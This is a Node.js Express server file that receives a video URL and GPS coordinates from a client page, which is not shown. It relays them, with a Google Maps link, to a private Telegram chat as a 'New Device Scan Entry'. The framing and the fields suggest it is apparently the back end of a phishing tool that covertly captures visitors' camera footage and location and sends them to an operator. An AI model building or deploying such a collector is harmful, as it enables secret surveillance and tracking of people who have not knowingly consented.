// server.js
const express = require('express');
const path = require('path');
const FormData = require('form-data');
const cors = require('cors');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("❌ TELEGRAM token və ya chat ID tapılmadı!");
} else {
    console.log("✅ Telegram token və chat ID uğurla yükləndi.");
}

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/send-data', async (req, res) => {
    const { videoUrl, location } = req.body;
    console.log(`📩 New data received: video=${!!videoUrl}, location=${!!location}`);

    try {
        let messageText = `⚡️ *New Device Scan Entry!* ⚡️\n\n`;
        messageText += `*Device ID / URL:* ${videoUrl || 'Not provided'}\n`;

        if (location?.latitude && location?.longitude) {
            messageText += `*Location:* [View on Google Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
            messageText += `Latitude: ${location.latitude}\nLongitude: ${location.longitude}\n`;
        } else {
            messageText += `*Location:* Not available or denied.\n`;
        }

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(`Telegram error: ${err.description}`);
        }

        console.log("✅ Message successfully sent to Telegram.");
        res.json({ ok: true, message: "Data sent to Telegram." });

    } catch (err) {
        console.error("❌ Error:", err.message);
        res.status(500).json({ message: err.message });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
